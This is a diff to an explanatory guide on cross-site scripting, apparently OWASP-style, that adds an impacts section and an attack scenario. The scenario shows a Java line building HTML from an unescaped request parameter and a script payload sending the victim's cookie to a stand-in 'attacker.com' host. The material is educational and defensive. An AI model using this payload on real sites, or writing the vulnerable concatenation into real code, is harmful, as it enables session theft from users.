@@ -14,6 +14,9 @@ Cross-Site-Scripting (XSS) attacks occur when:
 
 The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controller by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.
 
+## Impacts
+The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.
+
 ## Types of XSS
 
 ### Stored XSS
@@ -21,7 +24,20 @@ Stored XSS generally occurs when user input is stored on the target server, such
 And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser. With the advent of HTML5, and other browser technologies, we can envision the attack payload being permanently stored in the victim's browser, such as an HTML5 database, and never being sent to the server at all.
 
 ### Reflected XSS
-Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the provided by the user as part of the request, without that data being made safe to render in the browser and without permanently storing the user provided data.
+Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the provided by the user as part of the request, without that data being made safe to render in the browser and without permanently storing the user provided data. 
 
 ### DOM Based XSS
 DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source (where malicious data is read) could be the URL of the page(e.g., document.location.href), or it could be an element of the HTML, and the sink is a sensitive method call that causes the execution of the malicious data(e.g., document.write).
+
+## Example Attack Scenarios
+The application uses untrusted data in the construction of the following snippet without validation or escaping:
+```
+(String) page += "<input name='creditcard' type='text' value='" + request.getParameter("CC") + "'/>";
+```
+The attacker modifies the 'CC' parameter in the browser to:
+```
+<script>document.location='http://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>
+```
+The attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session.
+
+
